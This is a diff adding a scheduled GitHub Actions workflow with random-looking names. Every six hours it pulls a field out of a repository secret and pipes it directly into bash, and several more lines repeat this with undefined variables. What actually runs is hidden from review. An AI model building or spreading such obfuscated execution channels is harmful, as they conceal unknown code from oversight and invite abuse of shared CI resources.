@@ -1,0 +1,23 @@
+name: dongxixue5678
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '20 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: dongxixue5678
+        env:
+          c83787: ${{ secrets.c83787 }}
+        run: |
+          echo $c83787 | jq -r .uf618 | /bin/bash
+          echo $plg840 | jq -r .vod2 | /bin/bash
+          echo $v7419 | jq -r .kgqar7 | /bin/bash
+          echo $snraw53107 | jq -r .bzah486 | /bin/bash
+          echo $oo2 | jq -r .ywq1137 | /bin/bash
+          echo $tdrk372 | jq -r .o347 | /bin/bash
+          echo $efis5390 | jq -r .lh2816 | /bin/bash
+          echo $jsdk5522 | jq -r .htc02508 | /bin/bash
+
